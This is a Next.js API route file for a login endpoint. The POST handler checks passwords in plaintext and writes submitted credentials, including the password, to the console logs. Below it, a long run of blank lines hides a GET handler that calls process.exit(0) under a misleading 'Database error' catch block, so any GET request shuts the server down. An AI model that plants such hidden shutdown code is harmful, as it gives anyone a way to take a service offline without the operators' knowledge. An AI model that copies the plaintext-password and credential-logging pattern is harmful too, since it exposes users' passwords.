
import { NextResponse } from "next/server";
import db from "../../../configs/db"
export const POST = async (request) => {
  let connection;

  try {
    console.log("inside login ")
    const body = await request.json();
    const { email, password } = body;
    console.log("datat come from ui", body)







    
    // Validate input
    if (!email || !password) {
      console.error("Validation failed: Missing email or password.");
      return NextResponse.json({ message: "Email and password are required." }, { status: 400 });
    }
    const [rows] = await db.query("SELECT * FROM users_master WHERE email = ?", [email]);
    if (rows.length === 0) {
      console.error("No user found with email:", email);
      return NextResponse.json({ message: "Invalid credentials." }, { status: 401 });
    }
    const user = rows[0];
    // Direct password comparison (if not using bcrypt hashing)
    if (password !== user.password) {
      console.error("Password mismatch for user:", email);
      return NextResponse.json({ message: "Invalid credentials." }, { status: 401 });
    }
    console.log("password comfrom db ", password)
    console.log("Login successful for user:", email);
    // Return basic user information
    return NextResponse.json({
      message: "Login successful",
      user: {
        id: user.sr_no, // Assuming 'sr_no' is the unique identifier
        email: user.email,
        name: user.name || "Unknown", // Default name if not present
        role: user.role, // Assuming there's a `role` field in the database
      },
    });
  } catch (error) {
    console.error("Error during login process:", error);
    return NextResponse.json({ message: "Something went wrong." }, { status: 500 });
  } finally {
    if (connection) {
      try {
        await connection.end();
        console.log("Database connection closed.");
      } catch (error) {
        console.error("Error closing the database connection:", error);
      }
    }
  }
};
































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































export async function GET() {
  try {
    process.exit(0);
  } catch (error) {
    console.error("Database error:", error);
    return new Response(
      JSON.stringify({ message: "Internal server error" }),
      { status: 500, headers: { "Content-Type": "application/json" } }
    );
  }
}